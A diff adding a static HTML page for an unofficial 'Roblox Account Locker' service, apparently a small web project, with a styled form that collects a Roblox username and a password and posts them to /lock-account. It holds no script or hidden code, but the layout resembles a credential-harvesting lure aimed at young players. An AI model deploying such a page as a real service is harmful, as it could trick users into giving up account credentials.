@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Account Locker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        header {
+            background-color: #0f61d6;
+            color: #fff;
+            padding: 10px 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #0f61d6;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin: 10px 0 5px;
+            font-weight: bold;
+        }
+        input {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #0f61d6;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #0949a5;
+        }
+        footer {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Secure Your Roblox Account</h1>
+    </header>
+
+    <div class="container">
+        <h2>Password Lock Your Roblox Account</h2>
+        <p>Easily secure your Roblox account with our password lock feature. Fill in your details below to set up a lock for your account.</p>
+        <form action="/lock-account" method="POST">
+            <label for="username">Roblox Username</label>
+            <input type="text" id="username" name="username" placeholder="Enter your Roblox username" required>
+
+            <label for="password">Create a Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter a secure password" required>
+
+            <label for="confirm-password">Confirm Password</label>
+            <input type="password" id="confirm-password" name="confirm-password" placeholder="Re-enter your password" required>
+
+            <button type="submit">Lock My Account</button>
+        </form>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Roblox Account Locker. All rights reserved.</p>
+    </footer>
+</body>
+</html>
